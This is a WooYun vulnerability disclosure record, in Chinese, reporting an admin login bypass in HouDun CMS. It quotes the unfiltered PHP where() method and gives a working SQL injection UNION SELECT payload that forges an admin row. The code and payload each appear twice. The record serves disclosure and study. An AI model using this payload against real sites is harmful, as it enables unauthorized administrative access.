{"id": 53594, "wybug_id": "wooyun-2014-067049", "wybug_title": "后盾CMS管理系统后台登陆绕过", "wybug_corp": "后盾CMS", "wybug_author": "noob", "wybug_date": "2014-07-06 13:21", "wybug_open_date": "2014-08-20 13:22", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析", "后台注入绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-06：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-08-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 没过滤参数导致构建万能密码 详细说明：  判断登陆逻辑：先查询用户名是否存在，如果存在就拿password+ db中的code字段做MD5处理与db password比较在查询用户是否存在的时候没有过滤参数，导致可以SQL注入Db.class.php where方法没有过滤：\n/**     * SQL查询条件     * @param mixed $opt 链式操作中的WHERE参数     * @return string     */    public function where($opt)    {        $where = '';        if (empty($opt)) {            return false;        } else if (is_numeric($opt)) {            $where .= ' ' . $this->opt['pri'] . \"=$opt \";        } else if (is_string($opt)) {            $where .= \" $opt \";        } else if (is_numeric(key($opt)) && is_numeric(current($opt))) {            $where .= ' ' . $this->opt['pri'] . ' IN(' . implode(',', $opt) . ')';        } else if (is_array($opt)) {            foreach ($opt as $k => $v) {                if (method_exists($this, $k)) {                    $this->$k($v);                } else if (is_array($v)) {                    foreach ($v as $n => $m) {                        if (isset($this->condition[$n])) {                            $where .= \" $k\" . $this->condition[$n] . (is_numeric($m) ? $m : \"'$m'\");                        } else if (in_array(strtoupper($m), array(\"OR\", \"AND\"))) {                            if (preg_match('@(OR|AND)\\s*$@i', $where)) {                                $where = substr($where, 0, -4);                            }                            $where .= strtoupper($m) . ' ';                        } else {                            if (is_numeric($m)) {                                $where .= \" $k in(\" . implode(',', $v) . \") \";                            } else {                                $where .= \" $k in('\" . implode(\"','\", $v) . \"') \";                            }                            break;                        }                        if (!preg_match('@(or|and)\\s*$@i', $where)) {                            $where .= ' AND ';                        }                    }                    if (!preg_match('@(or|and)\\s*$@i', $where)) {                        $where .= ' AND ';                    }                } else {                    if (is_numeric($k) && in_array(strtoupper($v), array('OR', 'AND'))) {                        if (preg_match('@(or|and)\\s*$@i', $where)) {                            $where = substr($where, 0, -4);                        }                        $where .= strtoupper($v) . ' ';                    } else if (is_numeric($k) && is_string($v)) {                        $where .= $v . ' AND ';                    } else if (is_string($k)) {                        $where .= (is_numeric($v) ? \" $k=$v \" : \" $k='$v' \") . ' AND ';                    }                }            }        }        $where = trim($where);        if (!empty($where)) {            if (empty($this->opt['where'])) {                $this->opt['where'] = \" WHERE $where\";            } elseif (!preg_match('@^\\s*(or|and)@i', $where)) {                $this->opt['where'] .= ' AND ' . $where;            }        }        $this->opt['where'] = preg_replace('@(or|and)\\s*$@i', '', $this->opt['where']);    }\n绕过登陆SQL:\n' UNION SELECT 1,'admin','admin','6512bd43d9caa6e02c990b0a82652dca',1,'ast@sk.com','1',1,1,1,1,1,0,1,1,1,0,1,1,'','admin',0,'',1,'超级管理员','超级管理员',1,1,10000,1,1 LIMIT 1-- 6512bd43d9caa6e02c990b0a82652dca 是md5(11)的值\n   漏洞证明：  判断登陆逻辑：先查询用户名是否存在，如果存在就拿password+ db中的code字段做MD5处理与db password比较在查询用户是否存在的时候没有过滤参数，导致可以SQL注入Db.class.php where方法没有过滤：\n/**     * SQL查询条件     * @param mixed $opt 链式操作中的WHERE参数     * @return string     */    public function where($opt)    {        $where = '';        if (empty($opt)) {            return false;        } else if (is_numeric($opt)) {            $where .= ' ' . $this->opt['pri'] . \"=$opt \";        } else if (is_string($opt)) {            $where .= \" $opt \";        } else if (is_numeric(key($opt)) && is_numeric(current($opt))) {            $where .= ' ' . $this->opt['pri'] . ' IN(' . implode(',', $opt) . ')';        } else if (is_array($opt)) {            foreach ($opt as $k => $v) {                if (method_exists($this, $k)) {                    $this->$k($v);                } else if (is_array($v)) {                    foreach ($v as $n => $m) {                        if (isset($this->condition[$n])) {                            $where .= \" $k\" . $this->condition[$n] . (is_numeric($m) ? $m : \"'$m'\");                        } else if (in_array(strtoupper($m), array(\"OR\", \"AND\"))) {                            if (preg_match('@(OR|AND)\\s*$@i', $where)) {                                $where = substr($where, 0, -4);                            }                            $where .= strtoupper($m) . ' ';                        } else {                            if (is_numeric($m)) {                                $where .= \" $k in(\" . implode(',', $v) . \") \";                            } else {                                $where .= \" $k in('\" . implode(\"','\", $v) . \"') \";                            }                            break;                        }                        if (!preg_match('@(or|and)\\s*$@i', $where)) {                            $where .= ' AND ';                        }                    }                    if (!preg_match('@(or|and)\\s*$@i', $where)) {                        $where .= ' AND ';                    }                } else {                    if (is_numeric($k) && in_array(strtoupper($v), array('OR', 'AND'))) {                        if (preg_match('@(or|and)\\s*$@i', $where)) {                            $where = substr($where, 0, -4);                        }                        $where .= strtoupper($v) . ' ';                    } else if (is_numeric($k) && is_string($v)) {                        $where .= $v . ' AND ';                    } else if (is_string($k)) {                        $where .= (is_numeric($v) ? \" $k=$v \" : \" $k='$v' \") . ' AND ';                    }                }            }        }        $where = trim($where);        if (!empty($where)) {            if (empty($this->opt['where'])) {                $this->opt['where'] = \" WHERE $where\";            } elseif (!preg_match('@^\\s*(or|and)@i', $where)) {                $this->opt['where'] .= ' AND ' . $where;            }        }        $this->opt['where'] = preg_replace('@(or|and)\\s*$@i', '', $this->opt['where']);    }\n绕过登陆SQL:\n' UNION SELECT 1,'admin','admin','6512bd43d9caa6e02c990b0a82652dca',1,'ast@sk.com','1',1,1,1,1,1,0,1,1,1,0,1,1,'','admin',0,'',1,'超级管理员','超级管理员',1,1,10000,1,1 LIMIT 1-- 6512bd43d9caa6e02c990b0a82652dca 是md5(11)的值\n\n\n\n\n   修复方案：  针对where方法过滤   版权声明：转载请注明来源 noob@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}